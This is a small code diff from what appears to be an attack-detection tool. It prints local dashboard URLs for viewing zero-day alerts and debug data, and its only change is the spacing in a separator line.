     print("  Check http://127.0.0.1:8090/attacks for ZERO_DAY alerts.")
     print("  Check http://127.0.0.1:8090/api/zero-day-stats for baseline info.")
     print("  Check http://127.0.0.1:8090/api/debug-bucket/<IP> for debugging.")
-    print("="*60)
+    print("=" * 60)
